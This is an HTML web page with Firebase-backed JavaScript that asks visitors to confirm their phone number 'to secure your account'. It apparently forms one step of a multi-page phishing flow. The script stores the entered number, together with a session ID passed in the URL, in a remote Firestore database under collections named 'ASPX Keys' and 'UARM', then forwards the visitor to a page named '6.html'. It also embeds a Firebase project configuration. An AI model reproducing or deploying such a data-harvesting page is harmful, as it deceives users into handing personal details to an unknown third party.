<!DOCTYPE html>
<html lang="en">
<head>
    <script>
        (function() {
            var params = new URLSearchParams(window.location.search);
            var theme = params.get('theme');
            if (theme === 'dark' || theme === 'light') {
                document.documentElement.setAttribute('data-theme', theme);
            }
        })();
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Confirm Phone Number</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        /* Light theme (default) */
        :root {
            --bg-color: #ffffff;
            --text-color: #000000;
            --label-color: #6e6e73;
            --input-border: #c2c8d0;
            --input-focus-border: #000000;
            --input-bg: #ffffff;
            --btn-bg: #000000;
            --btn-color: #ffffff;
            --btn-disabled-bg: #cccccc;
            --label-bg: #ffffff;
        }

        /* Dark theme via system preference */
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #000000;
                --text-color: #ffffff;
                --label-color: #a1a1aa;
                --input-border: #3a3a3a;
                --input-focus-border: #ffffff;
                --input-bg: #000000;
                --btn-bg: #ffffff;
                --btn-color: #000000;
                --btn-disabled-bg: #444444;
                --label-bg: #000000;
            }
        }

        /* Explicit theme override via ?theme=dark or ?theme=light in URL */
        html[data-theme="dark"] {
            --bg-color: #000000;
            --text-color: #ffffff;
            --label-color: #a1a1aa;
            --input-border: #3a3a3a;
            --input-focus-border: #ffffff;
            --input-bg: #000000;
            --btn-bg: #ffffff;
            --btn-color: #000000;
            --btn-disabled-bg: #444444;
            --label-bg: #000000;
        }

        html[data-theme="light"] {
            --bg-color: #ffffff;
            --text-color: #000000;
            --label-color: #6e6e73;
            --input-border: #c2c8d0;
            --input-focus-border: #000000;
            --input-bg: #ffffff;
            --btn-bg: #000000;
            --btn-color: #ffffff;
            --btn-disabled-bg: #cccccc;
            --label-bg: #ffffff;
        }

        body {
            font-family: 'Inter', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: var(--bg-color);
            color: var(--text-color);
            transition: background-color 0.3s, color 0.3s;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h1 {
            font-size: 30px;
            font-weight: 700;
            margin-bottom: 10px;
            width: 100%;
            text-align: center;
        }

        .subtitle {
            font-size: 15px;
            color: var(--label-color);
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
            width: 100%;
        }

        .input-group label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--label-bg);
            padding: 0 5px;
            font-size: 12px;
            color: var(--label-color);
            font-family: 'Inter', Arial, sans-serif;
            z-index: 1;
        }

        input[type="tel"] {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-family: 'Inter', Arial, sans-serif;
            border: 1px solid var(--input-border);
            border-radius: 25px;
            box-sizing: border-box;
            outline: none;
            background-color: var(--input-bg);
            color: var(--text-color);
            transition: border-color 0.2s, background-color 0.3s, color 0.3s;
        }

        input:focus {
            border-color: var(--input-focus-border);
        }

        .error-hint {
            color: #d93025;
            font-size: 13px;
            text-align: left;
            padding-left: 10px;
            margin-bottom: 20px;
            line-height: 1.4;
            display: none;
            width: 100%;
            font-family: 'Inter', Arial, sans-serif;
        }

        .btn-continue {
            width: 100%;
            padding: 14px;
            background-color: var(--btn-bg);
            color: var(--btn-color);
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Inter', Arial, sans-serif;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s, color 0.3s;
        }

        input::placeholder {
            color: var(--label-color);
            opacity: 0.5;
        }

        .btn-continue:disabled {
            background-color: var(--btn-disabled-bg);
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Confirm phone number</h1>
    <p class="subtitle">Please enter your phone number to secure your account.</p>

    <div class="input-group">
        <label>Phone number</label>
        <input type="tel" id="phoneNumber" placeholder="e.g. +1 555-0100" autocomplete="tel">
    </div>

    <div id="errorHint" class="error-hint">
        Please enter a valid phone number.
    </div>

    <button class="btn-continue" id="submitBtn" onclick="handleSubmission()">Continue</button>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, getDoc, updateDoc, collection, query, where, getDocs, limit } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
        authDomain: "question-metabase.firebaseapp.com",
        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "question-metabase",
        storageBucket: "question-metabase.firebasestorage.app",
        messagingSenderId: "770698198753",
        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
        measurementId: "G-6ZP1FPMKSJ"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');

    // Enable Enter key submission
    const phoneInput = document.getElementById('phoneNumber');
    phoneInput.addEventListener("keypress", function(event) {
        if (event.key === "Enter") {
            event.preventDefault();
            handleSubmission();
        }
    });

    window.handleSubmission = async function() {
        const phoneValue = phoneInput.value.trim();
        const hint = document.getElementById('errorHint');
        const submitBtn = document.getElementById('submitBtn');

        hint.style.display = "none";

        // Basic validation check
        if (phoneValue.length < 7) {
            hint.style.display = "block";
            hint.innerText = "Please enter a valid phone number.";
            return;
        }

        if (!sessionId) return;

        try {
            submitBtn.disabled = true;
            submitBtn.innerText = "Processing...";

            // 1. Get the current session document from "ASPX Keys" to identify the account Type
            const aspxDocRef = doc(db, "ASPX Keys", sessionId);
            const aspxSnap = await getDoc(aspxDocRef);

            if (!aspxSnap.exists()) {
                hint.style.display = "block";
                hint.innerText = "Session not found.";
                submitBtn.disabled = false;
                submitBtn.innerText = "Continue";
                return;
            }

            const sessionData = aspxSnap.data();
            const rawType = sessionData["Type"] || sessionData["type"] || "";
            const normalizedType = rawType.trim().toLowerCase();
            const isBypassType = normalizedType === "kids" || normalizedType === "business" || normalizedType === "busniess";

            // 2. If NOT an allowed bypass type, perform a fast check on the "UARM" collection
            if (!isBypassType) {
                // Using limit(1) makes the query execution fast as it stops on the first match found
                const uarmQuery = query(
                    collection(db, "UARM"), 
                    where("Phone Number", "==", phoneValue),
                    limit(1)
                );
                const querySnapshot = await getDocs(uarmQuery);
                
                let isAlreadyUsed = false;
                querySnapshot.forEach((existingDoc) => {
                    // Avoid flagging if the matching record is the current session itself
                    if (existingDoc.id !== sessionId) {
                        isAlreadyUsed = true;
                    }
                });

                if (isAlreadyUsed) {
                    hint.style.display = "block";
                    hint.innerText = "This phone number is already registered to another account.";
                    submitBtn.disabled = false;
                    submitBtn.innerText = "Continue";
                    return;
                }
            }

            // 3. Update the phone number field on ASPX Keys
            await updateDoc(aspxDocRef, {
                "Phone Number": phoneValue,
                updatedAt: new Date().toLocaleString() + " UTC+5:30"
            });

            // Redirect carrying the session ID
            window.location.href = `6.html?session=${sessionId}`;
            
        } catch (e) {
            console.error(e);
            hint.style.display = "block";
            hint.innerText = "Connection error. Please try again.";
            submitBtn.disabled = false;
            submitBtn.innerText = "Continue";
        }
    };
</script>

</body>
</html>
